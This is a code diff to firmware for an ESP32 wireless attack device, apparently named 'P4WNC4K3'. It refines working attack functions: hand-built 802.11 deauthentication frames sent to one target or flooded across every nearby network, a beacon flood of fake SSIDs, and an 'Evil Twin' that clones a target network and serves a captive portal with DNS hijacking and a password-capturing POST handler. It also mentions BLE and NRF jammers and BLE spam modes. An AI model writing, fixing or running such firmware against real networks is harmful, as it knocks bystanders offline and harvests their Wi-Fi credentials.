+  if (millis() - lastHeapCheck > 10000) {  // Check every 10 seconds
+    if (ESP.getFreeHeap() < 20000) {
+      addToConsole("WARN: Low memory!");
+      Serial.printf("⚠️  Free heap: %d bytes\n", ESP.getFreeHeap());
+    }
+    lastHeapCheck = millis();
+  }
+  
   handleTouch();
   handleSerialCommands();
   
@@ -1616,8 +1976,7 @@ void loop() {
   if (continuousWiFiScan && currentState == WIFI_SCAN) {
     int scanStatus = WiFi.scanComplete();
     
-    if (scanStatus >= 0) {  // Scan complete
-      // Update network list
+    if (scanStatus >= 0) {
       networkCount = (scanStatus > 50) ? 50 : scanStatus;
       
       for (int i = 0; i < networkCount; i++) {
@@ -1632,41 +1991,41 @@ void loop() {
         }
       }
       
-      // Refresh display
-      if (millis() - lastWiFiScanTime > 300) {  // Throttle updates
+      if (millis() - lastWiFiScanTime > 300) {
         displayWiFiScanResults();
         lastWiFiScanTime = millis();
       }
       
-      // Start next scan immediately
       WiFi.scanDelete();
       WiFi.scanNetworks(true);
     }
   }
   
-  // CONTINUOUS BLE SCAN UPDATE
   if (continuousBLEScan && currentState == BLE_SCAN_RESULTS) {
-    if (millis() - lastBLEScanUpdate > 2000) {  // Update every 2 seconds
-      BLEScanResults results = pBLEScan->getResults();
-      bleDeviceCount = results.getCount();
-      if (bleDeviceCount > 50) bleDeviceCount = 50;
-      
-      for (int i = 0; i < bleDeviceCount; i++) {
-        BLEAdvertisedDevice device = results.getDevice(i);
-        bleDevices[i].address = device.getAddress().toString().c_str();
-        bleDevices[i].name = device.haveName() ? device.getName().c_str() : "Unknown";
-        bleDevices[i].rssi = device.getRSSI();
+    if (millis() - lastBLEScanUpdate > 2000) {
+      // FIX: Check if pBLEScan is valid before using
+      if (pBLEScan != nullptr) {
+        BLEScanResults results = pBLEScan->getResults();
+        bleDeviceCount = results.getCount();
+        if (bleDeviceCount > 50) bleDeviceCount = 50;
+        
+        for (int i = 0; i < bleDeviceCount; i++) {
+          BLEAdvertisedDevice device = results.getDevice(i);
+          bleDevices[i].address = device.getAddress().toString().c_str();
+          bleDevices[i].name = device.haveName() ? device.getName().c_str() : "Unknown";
+          bleDevices[i].rssi = device.getRSSI();
+        }
+        
+        displayBLEScanResults();
       }
-      
-      displayBLEScanResults();
       lastBLEScanUpdate = millis();
     }
   }
   
-  // CRITICAL: ZERO delay between deauth packets
+  // FIX: Add minimum delay for stability
   if (deauthActive) {
     performDeauth();
-    // NO delay(1) here - attack at maximum speed
+    delayMicroseconds(100);  // Prevent ESP32 crash from zero-delay loop
   }
   
   if (beaconFloodActive) {
@@ -1694,10 +2053,9 @@ void loop() {
     webServer.handleClient();
   }
   
-  // Update displays less frequently
   if (snifferActive && currentState == SNIFFER_ACTIVE) {
     static unsigned long lastSnifferUpdate = 0;
-    if (millis() - lastSnifferUpdate > 500) {  // Update every 500ms
+    if (millis() - lastSnifferUpdate > 500) {
       displaySnifferActive();
       lastSnifferUpdate = millis();
     }
@@ -1714,8 +2072,6 @@ void loop() {
       updateNRFJammerDisplay();
     }
   }
-  
-  // REMOVED: delay(1) - we want maximum attack speed
 }
 
 // ==================== WiFi Functions ====================
@@ -1832,13 +2188,6 @@ void startDeauth() {
   deauthActive = true;
   deauthPacketsSent = 0;
   
-  // CRITICAL: Set to AP mode FIRST
-  WiFi.mode(WIFI_MODE_NULL);
-  delay(100);
-  esp_wifi_set_mode(WIFI_MODE_AP);
-  delay(100);
-  
-  // Set channel
   int targetIndex = -1;
   for (int i = 0; i < networkCount; i++) {
     if (networks[i].ssid == selectedSSID) {
@@ -1847,11 +2196,38 @@ void startDeauth() {
     }
   }
   
-  if (targetIndex != -1) {
-    esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
-    Serial.printf("Set to channel %d\n", networks[targetIndex].channel);
+  if (targetIndex == -1) {
+    showMessage("Target not found!", COLOR_WARNING);
+    deauthActive = false;
+    return;
   }
   
+  // FIX: Check WiFi state before stopping
+  wifi_mode_t currentMode;
+  esp_wifi_get_mode(&currentMode);
+  if (currentMode != WIFI_MODE_NULL) {
+    esp_wifi_stop();
+  }
+  delay(100);
+  
+  // Set to AP mode with proper configuration
+  wifi_config_t ap_config = {};
+  strcpy((char*)ap_config.ap.ssid, "P4WNC4K3");
+  ap_config.ap.ssid_len = strlen("P4WNC4K3");
+  ap_config.ap.channel = networks[targetIndex].channel;
+  ap_config.ap.authmode = WIFI_AUTH_OPEN;
+  ap_config.ap.max_connection = 0;
+  ap_config.ap.beacon_interval = 60000;
+  
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  esp_wifi_start();
+  delay(200);
+  
+  // FIX: Only set channel once after WiFi is started
+  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
+  
+  Serial.printf("Deauth ready on channel %d\n", networks[targetIndex].channel);
   addToConsole("Deauth started: " + selectedSSID);
   showMessage("Deauth attack started!", COLOR_WARNING);
   delay(500);
@@ -1865,6 +2241,39 @@ void stopDeauth() {
 }
 
 void performDeauth() {
+  // If no specific target, flood all networks
+  if (selectedSSID.length() == 0 || currentState == WIFI_MENU) {
+    // FLOOD MODE - Attack all saved networks
+    for (int netIdx = 0; netIdx < networkCount && netIdx < 10; netIdx++) {
+      uint8_t deauthPacket[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x07, 0x00
+      };
+      
+      uint8_t *bssid = networks[netIdx].bssid;
+      
+      // Set channel for this network
+      esp_wifi_set_channel(networks[netIdx].channel, WIFI_SECOND_CHAN_NONE);
+      
+      // Send burst to this network
+      for (int burst = 0; burst < 2; burst++) {
+        memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+        memcpy(&deauthPacket[10], bssid, 6);
+        memcpy(&deauthPacket[16], bssid, 6);
+        
+        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+        deauthPacketsSent++;
+        delayMicroseconds(100);
+      }
+      yield();
+    }
+    return;
+  }
+  
+  // TARGETED MODE - Attack specific network
   int targetIndex = -1;
   for (int i = 0; i < networkCount; i++) {
     if (networks[i].ssid == selectedSSID) {
@@ -1875,20 +2284,16 @@ void performDeauth() {
   
   if (targetIndex == -1) return;
   
-  // FIXED: Proper deauth packet structure for ESP32
   uint8_t deauthPacket[26] = {
-    /*  0 - 1  */ 0xC0, 0x00,                          // Type/Subtype: Deauthentication
-    /*  2 - 3  */ 0x00, 0x00,                          // Duration
-    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
-    /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP BSSID
-    /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP
-    /* 22 - 23 */ 0x00, 0x00,                          // Sequence/Fragment
-    /* 24 - 25 */ 0x07, 0x00                           // Reason: Class 3 frame from non-associated STA
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x07, 0x00
   };
   
   uint8_t *bssid = networks[targetIndex].bssid;
   
-  // CRITICAL FIX: Set WiFi to AP mode BEFORE sending
   wifi_mode_t currentMode;
   esp_wifi_get_mode(&currentMode);
   if (currentMode != WIFI_MODE_AP) {
@@ -1896,37 +2301,29 @@ void performDeauth() {
     delay(10);
   }
   
-  // Send bursts with proper error handling
   for (int burst = 0; burst < 5; burst++) {
+    memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+    memcpy(&deauthPacket[10], bssid, 6);
+    memcpy(&deauthPacket[16], bssid, 6);
     
-    // Direction 1: AP -> Broadcast (disconnect all clients)
-    memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Destination: Broadcast
-    memcpy(&deauthPacket[10], bssid, 6);                      // Source: AP
-    memcpy(&deauthPacket[16], bssid, 6);                      // BSSID: AP
-    
-    // Send 3 packets
     for (int i = 0; i < 3; i++) {
       esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
       if (result == ESP_OK) {
         deauthPacketsSent++;
-      } else {
-        Serial.printf("TX Error: 0x%X\n", result);
       }
       delayMicroseconds(100);
     }
     
-    // Direction 2: Random Client -> AP (block reconnections)
     uint8_t randomClient[6];
     for (int j = 0; j < 6; j++) {
       randomClient[j] = random(0, 256);
     }
-    randomClient[0] = (randomClient[0] & 0xFE) | 0x02; // Set locally administered bit
+    randomClient[0] = (randomClient[0] & 0xFE) | 0x02;
     
-    memcpy(&deauthPacket[4], bssid, 6);         // Destination: AP
-    memcpy(&deauthPacket[10], randomClient, 6); // Source: Random client
-    memcpy(&deauthPacket[16], bssid, 6);        // BSSID: AP
+    memcpy(&deauthPacket[4], bssid, 6);
+    memcpy(&deauthPacket[10], randomClient, 6);
+    memcpy(&deauthPacket[16], bssid, 6);
     
-    // Send 3 packets
     for (int i = 0; i < 3; i++) {
       esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
       if (result == ESP_OK) {
@@ -1935,13 +2332,13 @@ void performDeauth() {
       delayMicroseconds(100);
     }
     
-    yield(); // Prevent watchdog
+    yield();
   }
   
   // Update display throttling
   static unsigned long lastDisplayUpdate = 0;
   if (millis() - lastDisplayUpdate > 500 && currentState == WIFI_ATTACK_MENU) {
-    int y = HEADER_HEIGHT + 35 + (2 * (BUTTON_HEIGHT + BUTTON_SPACING)) + 35;
+    int y = HEADER_HEIGHT + 35 + (3 * (BUTTON_HEIGHT + BUTTON_SPACING)) + 35;
     tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 15, COLOR_BG);
     tft.setTextSize(1);
     tft.setTextColor(COLOR_TEXT);
@@ -1964,12 +2361,67 @@ void startBeaconFlood() {
   drawWiFiMenu();
 }
 
+void startDeauthFlood() {
+  deauthActive = true;
+  deauthPacketsSent = 0;
+  
+  // Prepare WiFi
+  esp_wifi_stop();
+  delay(100);
+  
+  wifi_config_t ap_config = {};
+  strcpy((char*)ap_config.ap.ssid, "P4WNC4K3");
+  ap_config.ap.ssid_len = strlen("P4WNC4K3");
+  ap_config.ap.channel = 1;
+  ap_config.ap.authmode = WIFI_AUTH_OPEN;
+  ap_config.ap.max_connection = 0;
+  ap_config.ap.beacon_interval = 60000;
+  
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  esp_wifi_start();
+  delay(200);
+  
+  addToConsole("Deauth flood started");
+  showMessage("Deauthing all networks!", COLOR_WARNING);
+  delay(1000);
+  drawWiFiMenu();
+}
+
 void performBeaconFlood() {
-  static int beaconCounter = 0;
+  if (customBeaconCount == 0) return;
+  
+  static bool initialized = false;
+  static int beaconIndex = 0;
   static uint8_t channel = 1;
   
-  char fakeSSID[33];
-  sprintf(fakeSSID, "FREE_WIFI_%04X", random(0, 65536));
+  if (!initialized) {
+    // FIX: Check WiFi state before stopping
+    wifi_mode_t currentMode;
+    esp_wifi_get_mode(&currentMode);
+    if (currentMode != WIFI_MODE_NULL) {
+      esp_wifi_stop();
+    }
+    delay(100);
+    
+    wifi_config_t ap_config = {};
+    strcpy((char*)ap_config.ap.ssid, "P4WNC4K3");
+    ap_config.ap.ssid_len = strlen("P4WNC4K3");
+    ap_config.ap.channel = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    ap_config.ap.max_connection = 0;
+    ap_config.ap.beacon_interval = 60000;
+    
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    esp_wifi_start();
+    delay(200);
+    
+    initialized = true;
+  }
+  
+  String fakeSSID = customBeacons[beaconIndex];
+  beaconIndex = (beaconIndex + 1) % customBeaconCount;
   
   uint8_t beaconPacket[128];
   memset(beaconPacket, 0, sizeof(beaconPacket));
@@ -1981,16 +2433,20 @@ void performBeaconFlood() {
   }
   
   beaconPacket[37] = 0x00;
-  beaconPacket[38] = strlen(fakeSSID);
-  memcpy(&beaconPacket[39], fakeSSID, strlen(fakeSSID));
+  beaconPacket[38] = fakeSSID.length();
+  memcpy(&beaconPacket[39], fakeSSID.c_str(), fakeSSID.length());
   
-  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 39 + strlen(fakeSSID), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 39 + fakeSSID.length(), false);
   
-  beaconCounter++;
-  
-  if (beaconCounter % 50 == 0) {
+  static int packetCount = 0;
+  packetCount++;
+  if (packetCount % 20 == 0) {
     channel = (channel % 13) + 1;
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  }
+  
+  if (!beaconFloodActive) {
+    initialized = false;
   }
 }
 
@@ -2038,6 +2494,66 @@ void startCaptivePortal() {
   showMessage("Captive portal active!", COLOR_SUCCESS);
   delay(2000);
   drawWiFiMenu();
+}
+
+void startEvilTwin() {
+  if (selectedSSID.length() == 0 || networkCount == 0) {
+    showMessage("No target selected!", COLOR_WARNING);
+    return;
+  }
+  
+  int targetChannel = 1;
+  for (int i = 0; i < networkCount; i++) {
+    if (networks[i].ssid == selectedSSID) {
+      targetChannel = networks[i].channel;
+      break;
+    }
+  }
+  
+  // FIX: Check WiFi state before stopping
+  wifi_mode_t currentMode;
+  esp_wifi_get_mode(&currentMode);
+  if (currentMode != WIFI_MODE_NULL) {
+    esp_wifi_stop();
+  }
+  delay(100);
+  
+  // Configure for both deauth and AP
+  wifi_config_t ap_config = {};
+  strcpy((char*)ap_config.ap.ssid, selectedSSID.c_str());
+  ap_config.ap.ssid_len = selectedSSID.length();
+  ap_config.ap.channel = targetChannel;  // FIX: Channel set here
+  ap_config.ap.authmode = WIFI_AUTH_OPEN;
+  ap_config.ap.max_connection = 4;
+  ap_config.ap.beacon_interval = 100;
+  
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  esp_wifi_start();
+  delay(200);
+  
+  // FIX: Remove redundant channel setting - already set in ap_config
+  // esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE); // REMOVED
+  
+  deauthActive = true;
+  deauthPacketsSent = 0;
+  
+  portalActive = true;
+  dnsServer.start(53, "*", WiFi.softAPIP());
+  
+  webServer.on("/", HTTP_GET, handlePortalRoot);
+  webServer.on("/post", HTTP_POST, handlePortalPost);
+  webServer.on("/generate_204", HTTP_GET, handlePortalRoot);
+  webServer.on("/gen_204", HTTP_GET, handlePortalRoot);
+  webServer.on("/hotspot-detect.html", HTTP_GET, handlePortalRoot);
+  webServer.on("/canonical.html", HTTP_GET, handlePortalRoot);
+  webServer.on("/success.txt", HTTP_GET, handlePortalRoot);
+  webServer.onNotFound(handlePortalRoot);
+  webServer.begin();
+  
+  addToConsole("Evil Twin started: " + selectedSSID);
+  showMessage("Evil Twin Attack!", COLOR_WARNING);
+  delay(1000);
 }
 
 void stopCaptivePortal() {
@@ -2288,14 +2804,16 @@ void updateSnifferDisplay() {
 // ==================== BLE Functions ====================
 
 void scanBLEDevices() {
+  // FIX: Check if BLE is initialized before deinit
   if (bleJammerActive || appleSpamActive || androidSpamActive) {
-    BLEDevice::deinit(false);
+    if (BLEDevice::getInitialized()) {
+      BLEDevice::deinit(false);
+    }
     delay(100);
   }
   
   tft.fillScreen(COLOR_BG);
   
-  // Header with live indicator
   tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
   tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
   
@@ -2327,11 +2845,10 @@ void scanBLEDevices() {
   pBLEScan->setInterval(100);
   pBLEScan->setWindow(99);
   
-  // Start continuous scan
   continuousBLEScan = true;
-  pBLEScan->start(0, nullptr, false);  // 0 = infinite scan
+  pBLEScan->start(0, nullptr, false);
   
-  delay(3000);  // Initial scan period
+  delay(3000);
   
   displayBLEScanResults();
 }
@@ -2427,7 +2944,10 @@ void stopBLEJammer() {
   if (!bleJammerActive) return;
   
   bleJammerActive = false;
-  BLEDevice::deinit(false);
+  
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(false);
+  }
   
   addToConsole("BLE jammer stopped");
   showMessage("BLE Jammer Stopped", COLOR_SUCCESS);
